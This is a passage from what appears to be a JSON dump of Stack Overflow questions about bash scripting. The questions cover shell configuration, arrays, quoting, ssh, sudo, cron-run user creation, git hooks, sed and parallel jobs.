trying to do (put a trailing / on symlinks to directories), but as I read further, I saw that there was a way to skip completed text as well.  \"Awesome\", I said to myself, \"this bugs me about twice a week\".  So, I put that into my .inputrc as well, but it doesn't work, or even seem to recognize what's going on.  After logging out, and logging back in, this is what I'm seeing:</p>\n\n<pre><code>$ tail .inputrc \nset mark-symlinked-directories on\nset skip-completed-text on\n$ bash --version\nGNU bash, version 3.2.48(1)-release (x86_64-apple-darwin10.0)\nCopyright (C) 2007 Free Software Foundation, Inc.\n$ bind -V | grep completed\n$ bind -V | grep skip\n$ \n</code></pre>\n\n<p>That is, bash doesn't seem to recognize it's there at all... Is there something wrong with the version of bash supplied in Mountain Lion? Anything blindingly obvious I've forgotten to do?</p>\n"},{"tags":["git","bash","svn","shell","unix"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12537864,"title":"Find all files except those which is under version control systems (git or SVN)","body":"<p>I have to find all files on my computer except those which is under version control systems (git or SVN). I don't have to find not only meta files of VCS but all files in my working copy so i can't use something like</p>\n\n<p><code>find . -type f \\! -path \\*/\\.svn/\\*;</code></p>\n\n<p>Please, help me, cause i haven't any idea about it.<br />\nThank you!</p>\n"},{"tags":["bash","variables","scripting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12538043,"title":"Sending a parameter with space to another script in bash","body":"<p>I need to send a variable to another script (BASH) and uset after in this first script. The code goes something like this:</p>\n\n<pre><code>read var\nsource myscipt.sh $var\necho $var\n</code></pre>\n\n<p>The problem is that if y put spaces when entering $var after sending it to myscript.sh I only have the first one. </p>\n\n<p>NOTE: In myscript.sh I only use $1 does this have something to do with the problem?</p>\n\n<p>Thanx!!!</p>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12325370,"title":"Notify via email if something wrong got happened in the shell script","body":"<pre><code>fileexist=0\n  mv /data/Finished-HADOOP_EXPORT_&amp;Date#.done /data/clv/daily/archieve-wip/\n  fileexist=1\n--some other script below\n</code></pre>\n\n<p>Above is the shell script I have in which in the for loop, I am moving some files. I want to notify myself via email if something wrong got happened in the moving process, as I am running this script on the Hadoop Cluster, so it might be possible that cluster went down while this was running etc etc. So how can I have better <code>error handling mechanism</code> in this shell script? Any thoughts?</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12536636,"title":"Clone a variable in bash?","body":"<p>Before explaining my bash problem let me give you some context:</p>\n\n<p>I am writing some scripts using a bash \"framework\" we use at my current job. One of the feature of the framework is to init a sets of environments variables useful to run jobs on our cluster infrastructure.  </p>\n\n<p>These variables depend on a date specified by <code>$YY</code>, <code>$mm</code> and <code>$dd</code> which are also environment variables (yes, this is wired). To use the framework you start by defining the date and then you call a function to init other vars. This works fine when you write scripts that need variables for a specific day only. Today I am writing something which needs variables for 2 different days. Writing this I face a strange issue. For you to better understand the problem I wrote this code that simulate it:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>#!/bin/bash\n\nfunction assign(){\n    date=$1\n    date[1]=$YY\n    date[2]=$mm\n    date[3]=$dd\n}\n\nfunction display() {\n    date=$1\n    echo \"${date[1]}/${date[2]}/${date[3]}\"\n}\n\nexport YY=2012\nexport mm=09\nexport dd=20\ndeclare -a my_date1=()\nassign $my_date1\n\nexport YY=2012\nexport mm=08\nexport dd=20\ndeclare -a my_date2=()\nassign $my_date2\n\ndisplay $my_date1\ndisplay $my_date2\n</code></pre>\n\n<p>The expected output is:</p>\n\n<pre><code>2012/09/20\n2012/08/20\n</code></pre>\n\n<p>But the output is:</p>\n\n<pre><code>2012/08/20\n2012/08/20\n</code></pre>\n\n<p>At first I thought that the assign function filled the array with reference to <code>$YY</code>, <code>$mm</code> and <code>$dd</code> instead of their values. But then I try with the following code and it doesn't change the result. </p>\n\n<pre><code>date[1]=$(echo $YY)\ndate[2]=$(echo $mm)\ndate[3]=$(echo $dd)\n</code></pre>\n\n<p>Can somebody explain me what append?\nMaybe something wired with <code>date=$1</code>...</p>\n"},{"tags":["html","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12439370,"title":"A way to add code & join together?","body":"<p>Ok say I have 2 text docs, One containing the names of documents and the other containing the link to where that document is hosted.</p>\n\n<p>Is there a way/program or bash code that will allow me to make it all come together so it would look like this</p>\n\n<pre><code>&lt;li class=\"pureCssMenui\"&gt;&lt;a class=\"pureCssMenui\" href=\"https://docs.google.com/open?id=0B_KBy1Yc657LdnR5MGFXWVZZcnc\" target=\"_blank\"&gt;Cocoa in a nutshell.chm&lt;/a&gt;&lt;/li&gt;\n</code></pre>\n\n<p>So I guess add </p>\n\n<pre><code>&lt;li class=\"pureCssMenui\"&gt;&lt;a class=\"pureCssMenui\" href=\" to the beginning of each line in th links doc\n</code></pre>\n\n<p>then </p>\n\n<pre><code>target=\"_blank\"&gt;\n</code></pre>\n\n<p>to the beginning of the title docs then of course add</p>\n\n<pre><code>&lt;/a&gt;&lt;/li&gt;\n</code></pre>\n\n<p>to the end so that it will all come together.</p>\n\n<p>Also the links and titles will already be matched up by what line number they are on in each doc.</p>\n"},{"tags":["linux","bash","ssh","debian","remote-execution"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":712,"score":0,"question_id":12480284,"title":"SSH execute remote command.","body":"<p>I'm trying to connect to machine one with ssh and then connect to another machine two with ssh. But get this error.</p>\n\n<pre><code>ssh user@computerone.com 'ssh otheruser@computertwo.com'\n\nstdin: is not a tty\n</code></pre>\n\n<p>¿Why?</p>\n"},{"tags":["bash","script","append","echo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12503357,"title":"write a file, append if it exists otherwise create in bash","body":"<p>Im trying to write a file with the content of a variable, but if the file doesnt exist create it:</p>\n\n<p>So far i got this:</p>\n\n<pre><code>echo \"$Logstring\" &gt;&gt; $fileLog\n</code></pre>\n\n<p>What im missing because when the file doesnt exist theres an error. Is an if condition necessary?</p>\n"},{"tags":["linux","bash","shell","ceil","ceiling"],"answer_count":5,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4399,"score":7,"question_id":2394988,"title":"Get ceiling integer from number in linux (BASH)","body":"<p>How would I do something like:</p>\n\n<pre><code>ceiling(N/500)\n</code></pre>\n\n<p>N representing a number.</p>\n\n<p>But in a linux bash script</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12426606,"title":"How to source all files in a directory?","body":"<p>Why doesn't this work?</p>\n\n<pre><code>find . -maxdepth 1 -type f -print0 | xargs -0 .\n</code></pre>\n\n<p>All I get is <code>xargs: .: Permission denied</code>.</p>\n"},{"tags":["bash","script","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12533727,"title":"How do I enable bash tab complete from a different path?","body":"<p>I want to enable bash tab-complete to look for directories, but not in the current directory.</p>\n\n<p>So for instance, if I do:</p>\n\n<pre><code>$ ls $P\ndirs/ are/ here/\n$ cd /not/the/P/path\n$ ls\nother/ stuff/\n$ myProg &lt;tab&gt;\ndirs/ are/ here\n</code></pre>\n\n<p>This changes the usual behavior, where I would normally see files in the current directory. </p>\n\n<p><strong>Due diligence:</strong> The best I could come up with is:</p>\n\n<pre><code>_myProg ()\n{\n  local cur\n\n  COMPREPLY=()\n  cur=${COMP_WORDS[COMP_CWORD]}\n\n  if [ \"${P}x\" = \"x\" ]; then\n    return 1\n  fi\n\n  case \"$cur\" in\n    *)\n      pth=${P}/$( echo $cur | egrep -o \"^.*/[^/]*$\" )\n      COMPREPLY=( $( compgen -W \"$( cd $pth &amp;&amp; ls -1d \"$cur\"* 2&gt;/dev/null -- \"$cur\" )\" ) )\n      ;;\n  esac\n\n  return 0\n}\ncomplete -o nospace -F _myProg myProg\n</code></pre>\n\n<p>which initially shows directories, but doesnt let me drill down into the directories how I want (like <code>ls</code> works).</p>\n"},{"tags":["linux","bash","ssh","ftp","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12521829,"title":"Adding FTP user via bash script issue","body":"<p>I have a .sh file (lets say adduser.sh) that is executed via a cronjob that contains the commands to create an FTP user.</p>\n\n<p>The adduser.sh file looks like so...</p>\n\n<pre><code>#!/bin/bash\nmkdir /var/www/vhosts/domain/path;\nuseradd -d /var/www/vhosts/domain/path -ou &lt;uid&gt; -g &lt;group&gt; -s /bin/false &lt;username&gt;;\necho &lt;password&gt; | passwd &lt;username&gt; --stdin;\n</code></pre>\n\n<p>Now here is my problem. If I run it directly through SSH using...</p>\n\n<pre><code>sh adduser.sh\n</code></pre>\n\n<p>...no problems and it works as intended.</p>\n\n<p>But if I let the cronjob run it the directory is created but the user is not added.</p>\n\n<p>What gives?</p>\n"},{"tags":["bash","sh"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12323409,"title":"How to accomodate for spaces in a bash array","body":"<p>I am looping though a directory for a certain command; however, I do not know how to accommodate for spaces</p>\n\n<pre><code>#!/bin/bash\n\nimage=(`ls *.bmp *.jpeg *.jpg | sort`)\ndata=(`ls *.dat | sort`)\n\nfor ((i=0; i &lt; ${#image[@]}; i++))\ndo\n  echo ${image[$i]} ${data[$i]}\ndone\n</code></pre>\n\n<p>I ran this script and it returned</p>\n\n<pre><code>OIS032_OS.bmp Disc\nOIS034_OS.bmp Cube\nOIS035_OD.bmp 200x200_9-30-2010_OD\nOIS035_OS.bmp _ILM_RNFLOb.dat\nOIS036_OD.bmp OIS007_Optic\nOIS036_OS.bmp Disc\n</code></pre>\n\n<p>I wanted the program to return this line</p>\n\n<pre><code>OIS016_OD.bmp  OIS016_Optic Disc Cube 200x200_OS _ILM_RNFLOb.dat \n</code></pre>\n\n<p>How do I fix bash array to store what I need</p>\n\n<pre><code>data=(`ls *.dat | sort`) \n</code></pre>\n"},{"tags":["git","bash","scripting","githooks"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2122,"score":5,"question_id":3616648,"title":"git post-commit hook - script on committed files","body":"<p>Can I see somewhere an example post-commit hook to run a script on each committed file?</p>\n\n<p>eg. </p>\n\n<pre><code>git add file1\ngit add file2\n\ngit commit -am \"my commit\"\n</code></pre>\n\n<p>and the hook executes:</p>\n\n<pre><code>myscript -myparams \"file1\"\nmyscript -myparams \"file2\"\n</code></pre>\n\n<p>The best would be to have parameter to commit command to run this hook or not, eg. <code>git commit -X</code>… executes this post commit hook. Eventually an alias like <code>git-commitx</code>.</p>\n\n<p>How about the same version as a pre-commit hook on files in index? Can I abort a commit when execution of the scripts fails on one of the files?</p>\n\n<h3>Edit:</h3>\n\n<p>Here is what I have now: </p>\n\n<pre><code>#!/bin/sh                                     \n#.git/hooks/post-commit\ndir=`pwd`\necho ----------------------------------------------\necho PHP Mess Detector results for commited files:\necho ----------------------------------------------\ngit show --pretty=\"format:\" --name-only  | grep '\\.php$' | xargs -i phpmd $dir/'{}' text codesize,unused$\necho ----------------------------------------------\n</code></pre>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12533012,"title":"Create a unique list from two variables in a Linux bash shell script","body":"<p>I have two variables which have values that can be in both. I would like to create a unique list from the two variables. </p>\n\n<pre><code>VAR1=\"SERVER1 SERVER2 SERVER3\"\nVAR2=\"SERVER1 SERVER5\"\n</code></pre>\n\n<p>I am trying to get a result of:</p>\n\n<pre><code>\"SERVER1 SERVER2 SERVER3 SERVER5\"\n</code></pre>\n"},{"tags":["python","regex","perl","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":12531035,"title":"Fastest way of processing regexp","body":"<p>I have a script in python to process a log file - it parses the values and joins them simply with a <code>tab</code>.</p>\n\n<pre><code>p = re.compile(\n    \"([0-9/]+) ([0-9]+):([0-9]+):([0-9]+) I.*\"+\n    \"worker\\\\(([0-9]+)\\\\)(?:@([^]]*))?.*\\\\[([0-9]+)\\\\] \"+\n    \"=RES= PS:([0-9]+) DW:([0-9]+) RT:([0-9]+) PRT:([0-9]+) IP:([^ ]*) \"+\n    \"JOB:([^!]+)!([0-9]+) CS:([\\\\.0-9]+) CONV:([^ ]*) URL:[^ ]+ KEY:([^/]+)([^ ]*)\"\n  )\n\nfor line in sys.stdin:\n  line = line.strip()\n  if len(line) == 0: continue\n  result = p.match(line)\n      if result != None:\n    print \"\\t\".join([x if x is not None else \".\" for x in result.groups()])\n</code></pre>\n\n<p>However, the scripts behaves quite slowly and it takes a long time to process the data.</p>\n\n<p>How can I achieve the same behaviour in faster way? Perl/SED/PHP/Bash/...?</p>\n\n<p>Thanks</p>\n"},{"tags":["c","linux","bash","pipe"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":12532865,"title":"C: stdout hangs linux pipes","body":"<p>I've written a simple I/O echoing program in C to test a problem with a bigger real program. Here, linux FD redirection doesn't work.</p>\n\n<p>The echoing program (aka <code>a.out</code>) is:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char **argv) {\n  char buff[10];\n  while (1) {\n    if (fgets(buff, 10, stdin) == NULL) break;\n    printf(\"PRINT: %s \\n\", buff);\n  }\n}\n</code></pre>\n\n<p><br>\nFrom Bash, I run it as:</p>\n\n<pre><code>$ mkfifo IN OUT\n$ # this is a method to keep the pipes IN and OUT opened over time\n$ while :; do read; echo Read: $REPLY &gt;&amp;2; sleep 1; done &lt;OUT &gt;IN &amp;\n$ a.out &gt;OUT &lt;IN &amp;\n\n$ echo xyz &gt;IN\n</code></pre>\n\n<p>and there is no output produced: the Bash <code>while</code> loop isn't able to read from <code>OUT</code>.</p>\n\n<hr>\n\n<p>Let's compare this a.out with <code>cat</code>, which instead works as expected:</p>\n\n<pre><code>$ mkfifo IN OUT\n$ while :; do read; echo Read: $REPLY &gt;&amp;2; sleep 1; done &lt;OUT &gt;IN &amp;\n$ cat &gt;OUT &lt;IN &amp;\n\n$ echo xyz &gt;IN\nRead: xyz\n</code></pre>\n\n<p>This last line is printed on console to stderr.\n<code>cat</code>'s output, differently from a.out's, is able to travel across <code>OUT</code> and reach the Bash <code>while</code> loop, which then prints it on console.\n<br>\nWhat's wrong with a.out?</p>\n"},{"tags":["linux","bash","sudo","su","sudoers"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":6425,"score":6,"question_id":6905697,"title":"how to run script as another user without password","body":"<p>I have script.sh that must be run as user2.  However, this script can only be run under user1 in my application.</p>\n\n<p>I would like the following command to run:</p>\n\n<pre><code>su user2 -C script.sh\n</code></pre>\n\n<p>but be able to run without password.</p>\n\n<p>I also want this to be very restrictive, as in user1 can only run script.sh under user2 and nothing else.</p>\n\n<p>I've tried doing this with sudoers file and just got endlessly confused after hours of trying.</p>\n\n<p>If somebody can provide an explicit example of how this can be accomplished (instead of something generic like use sudoers), it would be greatly appreciated.</p>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":12532474,"title":"bash: trying to to run a command that open xterm and then change the directory","body":"<p>I'm trying create a command to open xterm and then change the directory that shows xterm by default.</p>\n\n<p>I'm pressing Alt+F2 and then i run <code>xterm | cd /home/tirengarfio/Music</code>, but it doesn't change the directory...</p>\n\n<p>I know that i could change the default directory that xterm shows by default, but I'm interested in do it dynamic: this time I want to go Music but the next time I will be interested in another folder..</p>\n\n<p>Any idea?</p>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12526364,"title":"expand chars with special meaning in bash here-string","body":"<p>Code goes below:</p>\n\n<pre><code>#!/bin/bash\n\nwd1=\"hello\"\nwd2=\"world\"\n\ncat &gt;&gt; log.txt &lt;&lt;&lt;\"$wd1\\t$wd2\\n\\n\"\n</code></pre>\n\n<p>When I run the above script, <code>'\\t','\\n'</code> were not expanded at all. So I altered it to this:</p>\n\n<pre><code>cat &gt;&gt; log.txt &lt;&lt;&lt;$(echo -e \"$wd1\\t$wd2\\n\\n\")\n</code></pre>\n\n<p>But <code>'\\t','\\n'</code> are still not expanded. Why?</p>\n"},{"tags":["bash","if-statement","boolean","logical"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":12526909,"title":"bash if logical boolean string","body":"<p>I am <em>not</em> looking for a different way to accomplish the apparent intention.  I'm looking to <em>understand</em> why this <em>exact</em> syntax is not working.</p>\n\n<pre><code>[root@lvs ~]# while true;do\n&gt; echo \"Would you like the script to check the second box ([y]n)?\"\n&gt; read ans\n&gt;         if [ \"$ans\" == \"n\" ];then\n&gt;                 echo\n&gt;                 echo \"bye\"\n&gt;                 exit\n&gt;         elif [ \"$ans\" != \"\" -o \"$ans\" != \"y\" ];then\n&gt;                 echo \"Invalid entry...\"\n&gt;         else\n&gt;                 break\n&gt;         fi\n&gt; done\nWould you like the script to check the second box ([y]n)? **\"Should have continued\"**\n\nInvalid entry...\nWould you like the script to check the second box ([y]n)? **\"Should have continued\"**\ny\nInvalid entry...\nWould you like the script to check the second box ([y]n)? **\"Correct behavior\"**\nalskjfasldasdjf\nInvalid entry...\nWould you like the script to check the second box ([y]n)? **\"Correct behavior\"**\nn\n\nbye\n</code></pre>\n\n<p>Here's a reference that's identical to so many others i found. I <em>understand</em> what it's doing, it's using the non logical's for AND and OR when everything I've read said that it should be using logical bools.</p>\n\n<p><a href=\"http://www.groupsrv.com/linux/about140851.html\" rel=\"nofollow\">http://www.groupsrv.com/linux/about140851.html</a></p>\n\n<p>Ok so here it is, with Nahuel's suggestion behaving how I had originally expected it to:</p>\n\n<pre><code>[root@lvs ~]# while true;do\n&gt; echo \"Would you like the script to check the second box ([y]n)?\"\n&gt; read ans\n&gt;         if [ \"$ans\" = \"n\" ];then\n&gt;                 echo\n&gt;                 echo \"bye!\"\n&gt;                 exit\n&gt;         elif [ \"$ans\" != \"\" -a \"$ans\" != \"y\" ];then\n&gt;                 echo \"Invalid entry...\"\n&gt;         else\n&gt;                 break\n&gt;         fi\n&gt; done\nWould you like the script to check the second box ([y]n)?\nasdfad\nInvalid entry...\nWould you like the script to check the second box ([y]n)?\n\n[root@lvs ~]# while true;do\n&gt; echo \"Would you like the script to check the second box ([y]n)?\"\n&gt; read ans\n&gt;         if [ \"$ans\" = \"n\" ];then\n&gt;                 echo\n&gt;                 echo \"bye!\"\n&gt;                 exit\n&gt;         elif [ \"$ans\" != \"\" -a \"$ans\" != \"y\" ];then\n&gt;                 echo \"Invalid entry...\"\n&gt;         else\n&gt;                 break\n&gt;         fi\n&gt; done\nWould you like the script to check the second box ([y]n)?\ny\n[root@lvs ~]# while true;do\n&gt; echo \"Would you like the script to check the second box ([y]n)?\"\n&gt; read ans\n&gt;         if [ \"$ans\" = \"n\" ];then\n&gt;                 echo\n&gt;                 echo \"bye!\"\n&gt;                 exit\n&gt;         elif [ \"$ans\" != \"\" -a \"$ans\" != \"y\" ];then\n&gt;                 echo \"Invalid entry...\"\n&gt;         else\n&gt;                 break\n&gt;         fi\n&gt; done\nWould you like the script to check the second box ([y]n)?\nn\n\nlogout\n</code></pre>\n"},{"tags":["file","bash","directory","find","large-files"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":126,"score":1,"question_id":12522269,"title":"Bash - How to find the largest file in a directory and its subdirectories?","body":"<p>We're just starting a UNIX class and are learning a variety of Bash commands. Our assignment involves performing various commands on a directory that has a number of folders under it as well. </p>\n\n<p>I know how to list and count all the regular files from the root folder using: </p>\n\n<pre><code>find . -type l | wc -l\n</code></pre>\n\n<p>But I'd like to know where to go from there in order to find the largest file in the whole directory. I've seen somethings regarding a <code>du</code> command, but we haven't learned that, so in the repertoire of things we've learned I assume we need to somehow connect it to the <code>ls -t</code> command.</p>\n\n<p>And pardon me if my 'lingo' isn't correct, I'm still getting used to it!</p>\n"},{"tags":["bash","unix"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12530550,"title":"How to copy a .c file to a numbered listing","body":"<p>I simply want to copy  my .c file into a  line-numbered listing file. Basically generate a .prn file from my .c file. I'm having a hard time finding the right bash command to do so. </p>\n"},{"tags":["git","bash","github"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12530802,"title":"Github - Copying two repos with one SSH key","body":"<p>I want to pull two private github repos via bash script to my server. I used to do just one and this worked fine. This is the process that worked for me:</p>\n\n<ul>\n<li>Generate SSH on server</li>\n<li>Add to github repo's ssh list</li>\n<li>Compelte the git pull request</li>\n</ul>\n\n<p>Now I am trying to do this:</p>\n\n<ul>\n<li>Generate SSH</li>\n<li>Add key to first github repo's ssh list</li>\n<li>Add key to second github repo's ssh list</li>\n<li>Compelte the first repo git pull request</li>\n<li>Compelte the second repo git pull request</li>\n</ul>\n\n<p>However, when I try to add the same key to the second repo I want to copy, github says it is already in use. How am I supposed to do this? Should I be generating two seperate SSH's keys on the server and use one for one github repo and one for the other?</p>\n"},{"tags":["bash","shell","ksh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12520281,"title":"line replacement in a file in shell scripting","body":"<p>I want to search for the entire line and replace the line with 1 or more lines .</p>\n\n<p>for eg Hi I m there .</p>\n\n<p>I have to replace it with  these 2 lines </p>\n\n<p>Hi I m there </p>\n\n<p>Arun is here </p>\n\n<p>Basically what I m trying to do is Insert a new line after the matching line .since I m not sure of line numbers ,thought I would serach for the line after which it should be placed and just replace this line with 2 lines .is it posssible ? the code i used var1 and var are picked up from a csv file and f is the file name </p>\n\n<pre><code>\"s@$Var1@$Var2@g\" \"$f\"  \n</code></pre>\n"},{"tags":["bash","emacs"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12523345,"title":"open a file in an emacs buffer while in emacs terminal","body":"<p>Suppose I am in terminal in Emacs (M-x term), and I list the following files in current directory:</p>\n\n<p><code>text_code.R</code></p>\n\n<p>Now I am in bash-3.2$ (terminal) and hope to open this .R file in another Emacs buffer and then edit. Is there a way to do it? This might be a trivial question, for I am a newbie to Linux and Emacs. Thanks in advance!</p>\n"},{"tags":["json","bash"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12524437,"title":"Output JSON from Bash script","body":"<p>So I have a <code>bash</code> script which outputs details on servers. The problem is that I need the output to be <code>JSON</code>. What is the best way to go about this? Here is the bash script:</p>\n\n<pre><code># Get hostname\nhostname=`hostname -A` 2&gt; /dev/null\n\n# Get distro\ndistro=`python -c 'import platform ; print platform.linux_distribution()[0] + \" \" +        platform.linux_distribution()[1]'` 2&gt; /dev/null\n\n# Get uptime\nif [ -f \"/proc/uptime\" ]; then\nuptime=`cat /proc/uptime`\nuptime=${uptime%%.*}\nseconds=$(( uptime%60 ))\nminutes=$(( uptime/60%60 ))\nhours=$(( uptime/60/60%24 ))\ndays=$(( uptime/60/60/24 ))\nuptime=\"$days days, $hours hours, $minutes minutes, $seconds seconds\"\nelse\nuptime=\"\"\nfi\n\necho $hostname\necho $distro\necho $uptime\n</code></pre>\n\n<p>So the output I want is something like:</p>\n\n<pre><code>{\"hostname\":\"server.domain.com\", \"distro\":\"CentOS 6.3\", \"uptime\":\"5 days, 22 hours, 1 minutes, 41 seconds\"}\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["bash","shell","parallel-processing","wait"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":638,"score":1,"question_id":8040417,"title":"Parallel processing in shell scripting, 'pid is not a child of this shell'","body":"<p>I have a question about parallel processing in shell scripting. I have a program <code>my\nProgram</code>, which I wish to run multiple times, in a loop within a loop. This program is basically this: </p>\n\n<pre><code>MYPATHDIR=`ls $MYPATH`\nfor SUBDIRS in $MYPATHDIR; do\n  SUBDIR_FILES=`ls $MYPATH/$SUBDIRS`\n  for SUBSUBDIRS in $SUBDIR_FILES; do\n    find $MYPATH/$SUBDIRS/$SUBSUBDIRS | ./myProgram $MYPATH/$SUBDIRS/outputfile.dat\n  done\ndone\n</code></pre>\n\n<p>What I wish to do is to take advantage of parallel processing. So I tried this for the middle line to start all the <code>myPrograms</code> at once:</p>\n\n<pre><code>(find $MYPATH/$SUBDIRS/$SUBSUBDIRS | ./myProgram $MYPATH/$SUBDIRS/outputfile.dat &amp;)\n</code></pre>\n\n<p>However, this began all 300 or so calls to <code>myProgram</code> simultaneously, causing RAM issues etc. </p>\n\n<p>What I would like to do is to run each occurrence of <code>myProgram</code> in the inner loop in parallel, but wait for all of these to finish before moving on to the next outer loop iteration. Based on the answers to <a href=\"http://stackoverflow.com/questions/8038723/wait-for-all-processes-with-a-certain-name-to-finish-in-bash\">this question</a>, I tried the following:</p>\n\n<pre><code>for SUBDIRS in $MYPATHDIR; do\n  SUBDIR_FILES=`ls $MYPATH/$SUBDIRS`\n  for SUBSUBDIRS in $SUBDIR_FILES; do\n    (find $MYPATH/$SUBDIRS/$SUBSUBDIRS | ./myProgram $MYPATH/$SUBDIRS/outputfile.dat &amp;)\n  done\n  wait $(pgrep myProgram)   \ndone\n</code></pre>\n\n<p>But I got the following warning/error, repeated multiple times:</p>\n\n<pre><code>./myScript.sh: line 30: wait: pid 1133 is not a child of this shell\n</code></pre>\n\n<p>...and all the <code>myPrograms</code> were started at once, as before.</p>\n\n<p>What am I doing wrong? What can I do to achieve my aims? Thanks.</p>\n"},{"tags":["linux","bash","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12528605,"title":"incorrect exit on bash script","body":"<p>Sorry my english first of all.\nWhy in script below, when IF statement executed, user logaut from bash?</p>\n\n<pre><code>#!/bin/sh  \nif [ -z $1 ]; then  \n   echo \"1\"  \n   read w  \n   exit 1  \nfi  \nif [ \"$#\" -gt \"1\" ]; then\n   echo \"1\"\n  read w\n  exit 2\nfi\nexport PTSUSER=$1.\n&lt;some execute&gt;\n</code></pre>\n"},{"tags":["perl","bash","freebsd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":39,"score":0,"question_id":12527823,"title":"How can i dynamically assign filename with -w option in tcpdump.sh on freebsd?","body":"<p>How can i dynamically assign filename with -w option here ?</p>\n\n<p>I am working on freebsd. I want to dynamically assign filename to the file created using -w option in this perl script. I have been using following method but to no avail.</p>\n\n<pre><code>$name = `date`;\nsystem (\"nstcpdump.sh -C 1 -w $name\");\n</code></pre>\n\n<p>Can someone help me with this ?</p>\n"},{"tags":["bash","script","sed","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12526805,"title":"sed: properly replace lines containing paths via bash script","body":"<p>I am trying to write a bash script that will do backup-based DUPLICATE database (Oracle) from Production to Development host. One of the steps is to take a copy of the Production database pfile, edit it properly and then power-up a new instance on another host. I am having difficulties to do the following on my bash script:</p>\n\n<p>Production pfile: (single line taken as an example, all others are the same)</p>\n\n<pre><code>*.audit_file_dest='/u01/app/grid/admin/orcl11/adump'\n</code></pre>\n\n<p>Let's say that the above line should be changed completely to:</p>\n\n<pre><code>*.audit_file_dest='/u02/another/path'\n</code></pre>\n\n<p>I've had a look at the examples on StackOverflow, but I really can't understand them. Can someone please help me on that? </p>\n\n<p>Many thanks in advance!</p>\n\n<h2>EDIT: Thanks a lot guys. This worked out like a charm. Topic Answered.</h2>\n"},{"tags":["bash","unix","expect"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12034857,"title":"Passwordless Login","body":"<p><strong>Problem statement</strong></p>\n\n<p>I want to access a server without asking me the password (will be mentioned in the script) and run a command in the server.</p>\n\n<p><strong>My Code</strong> </p>\n\n<pre><code>#!/usr/bin/expect\nspawn sudo su - &lt;server_name&gt;\nexpect \"[sudo] password for chronicles:\"\nset Password \"xxxxxxx\"\nsend \"$Password\\r\"\n#set timeout 300\nsend \"whoami\\r\"\nsend \"ls -ltr\\r\"\nexpect eof\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>invalid command name \"sudo\"\n    while executing\n</code></pre>\n\n<p><strong>Restrictions</strong></p>\n\n<ul>\n<li>I dont have access rights to change env variables or modify\n.bash_profile / .bashrc.</li>\n<li>su server_name command not allowed</li>\n</ul>\n\n<p>Thanks for any help.</p>\n"},{"tags":["bash","scripting","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":12519481,"title":"How to replace 3rd column given that first two column match","body":"<p>This is what I am trying to achieve:</p>\n\n<pre><code>file1:\ntest fileb 4578;\ntest filec 7689;\ntest filey 9978;\ntest filez 12300;\n\nfile2:\ntest fileb 1;\ntest filec 2;\ntest filey 3;\n\n\nfile1 becomes:\ntest fileb 1;\ntest filec 2;\ntest filey 3;\ntest filez 